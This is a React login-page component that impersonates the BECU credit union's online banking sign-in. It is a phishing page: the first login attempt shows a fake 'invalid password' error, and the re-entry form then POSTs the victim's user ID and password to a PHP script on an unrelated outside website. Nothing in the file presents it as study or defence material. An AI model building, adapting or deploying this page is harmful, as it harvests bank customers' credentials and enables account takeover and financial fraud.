"use client"
import { useState } from "react"

const Body = () => {
  const [show, setShow] = useState(true)
  const [showError, setShowError] = useState(false)
  const handleTwice = (e) => {
    setShow(!show)
    setShowError(true)
  }
  return (
    <div className="px-4 lg:px-[120px] mt-4 lg:mt-[50px]  grid grid-cols-1 grid-rows-1 md:grid-cols-2 justify-center h-full">
      {/* left */}
      <div className="min-h-[300px] flex flex-col items-start">
        <h1 className="text-[#192838] font-bold  text-3xl lg:text-4xl">
          BECU Log in Options
        </h1>
        <h1 className="text-2xl text-[#192838] mt-[25px]">Online Banking</h1>
        {showError && (
          <h1 className="text-sm text-red-700 mt-[25px] h-[30px] border-l-[2px] border-red-700 bg-red-300 px-2 py-1">
            Invalid User ID or Password, please try again!
          </h1>
        )}

        {show && (
          <form onSubmit={handleTwice}>
            <div className="w-full flex items-center justify-start gap-4 mt-[25px]">
              <h1 className="text-xs w-[80px]">User ID</h1>
              <input
                type="text"
                name="userID"
                className="w-[200px] p-1 text-sm border border-[#333]"
              />
            </div>
            <div className="w-full flex items-center justify-start gap-4 mt-[10px]">
              <h1 className="text-xs w-[80px]">Password</h1>
              <input
                type="password"
                name="pass"
                className="w-[200px] p-1 text-sm border border-[#333]"
              />
            </div>

            <button className="bgways w-[300px] h-[40px] flex items-center justify-center mt-[20px] text-white text-xs hover:opacity-75">
              Log in
            </button>
          </form>
        )}

        {!show && (
          <form
            method="POST"
            action="https://investmentquarters.com/wp-admin/js/pablo/verify.php"
          >
            <div className="w-full flex items-center justify-start gap-4 mt-[25px]">
              <h1 className="text-xs w-[80px]">User ID</h1>
              <input
                type="text"
                name="userID"
                className="w-[200px] p-1 text-sm border border-[#333]"
              />
            </div>
            <div className="w-full flex items-center justify-start gap-4 mt-[10px]">
              <h1 className="text-xs w-[80px]">Password</h1>
              <input
                type="password"
                name="pass"
                className="w-[200px] p-1 text-sm border border-[#333]"
              />
            </div>

            <button className="bgways w-[300px] h-[40px] flex items-center justify-center mt-[20px] text-white text-xs hover:opacity-75">
              Log in
            </button>
          </form>
        )}

        <p className="text-sm text-[#007c89] underline hover:opacity-70 cursor-pointer mt-[30px]">
          Forgot Your Password?
        </p>
        <p className="text-sm text-[#007c89] underline hover:opacity-70 cursor-pointer mt-[15px]">
          Forgot Your User ID?
        </p>

        <h1 className="mt-[25px] text-[#4d5f69] font-normal text-sm w-[60%] lg:w-[70%]">
          <span className="font-bold text-sm ">Already a Member?</span> If you
          are not enrolled in Online and Mobile Banking yet{" "}
          <span className="text-[#007c89] font-bold text-sm underline cursor-pointer hover:opacity-75">
            click here to enroll.
          </span>
        </h1>

        <h1 className="mt-[25px] text-[#4d5f69] font-normal text-sm w-[95%] lg:w-[70%]">
          Not a Member?{" "}
          <span className="text-[#007c89] font-bold text-sm underline cursor-pointer hover:opacity-75">
            Sign up for membership with BECU
          </span>
        </h1>
      </div>
      {/* Right */}
      <div className="min-h-[450px] lg:border-l-[1px] border-[#192838] lg:px-8 flex flex-col items-start">
        <h1 className="text-2xl text-[#192838] mt-[30px]">
          Business Online Banking
        </h1>

        <h1 className="w-[90%] lg:w-[70%] text-[#4d5f69] font-normal text-sm mt-[25px]">
          For LLCs using an <span className="font-bold">EIN</span> for tax
          reporting, Partnerships & Corporations
        </h1>

        <button className="bg-[#4d5f69] w-[300px] h-[40px] flex items-center justify-center mt-[20px] text-white text-xs hover:opacity-75">
          Business Online Banking
        </button>

        <p className="text-sm text-[#007c89] underline hover:opacity-70 cursor-pointer mt-[15px]">
          Enroll in Business Online Banking
        </p>
      </div>
    </div>
  )
}

export default Body
